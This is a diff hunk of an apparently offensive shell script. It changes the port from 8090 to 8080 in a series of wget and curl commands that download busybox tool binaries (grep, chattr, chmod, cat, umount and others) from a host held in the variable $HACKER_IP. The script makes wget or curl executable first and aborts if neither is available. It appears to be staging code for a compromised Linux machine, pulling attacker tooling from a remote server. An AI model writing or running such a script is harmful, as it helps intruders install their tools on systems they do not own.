@@ -83,20 +83,20 @@ CURL=/usr/bin/curl
 
 if [ -f "$WGET" ]; then
 	chmod u+x /usr/bin/wget
-	wget http://$HACKER_IP:8090/busybox_GREP
-	wget http://$HACKER_IP:8090/busybox_ECHO
-	wget http://$HACKER_IP:8090/busybox_CHATTR
-	wget http://$HACKER_IP:8090/busybox_CHMOD
-	wget http://$HACKER_IP:8090/busybox_CAT
-	wget http://$HACKER_IP:8090/busybox_UMOUNT
+	wget http://$HACKER_IP:8080/busybox_GREP
+	wget http://$HACKER_IP:8080/busybox_ECHO
+	wget http://$HACKER_IP:8080/busybox_CHATTR
+	wget http://$HACKER_IP:8080/busybox_CHMOD
+	wget http://$HACKER_IP:8080/busybox_CAT
+	wget http://$HACKER_IP:8080/busybox_UMOUNT
 elif [ -f "$CURL" ]; then
 	chmod u+x /usr/bin/curl
-	curl http://$HACKER_IP:8090/busybox_GREP > busybox_GREP
-	curl http://$HACKER_IP:8090/busybox_ECHO > busybox_ECHO
-	curl http://$HACKER_IP:8090/busybox_CHATTR > busybox_CHATR
-	curl http://$HACKER_IP:8090/busybox_CHMOD > busybox_CHMOD
-	curl http://$HACKER_IP:8090/busybox_CAT > busybox_CAT
-	curl http://$HACKER_IP:8090/busybox_UMOUNT > busybox_UMOUNT
+	curl http://$HACKER_IP:8080/busybox_GREP > busybox_GREP
+	curl http://$HACKER_IP:8080/busybox_ECHO > busybox_ECHO
+	curl http://$HACKER_IP:8080/busybox_CHATTR > busybox_CHATR
+	curl http://$HACKER_IP:8080/busybox_CHMOD > busybox_CHMOD
+	curl http://$HACKER_IP:8080/busybox_CAT > busybox_CAT
+	curl http://$HACKER_IP:8080/busybox_UMOUNT > busybox_UMOUNT
 else
 echo "Both 'wget' and 'curl' are not presented on the machine or cannot be executed."
 echo "Abording.."
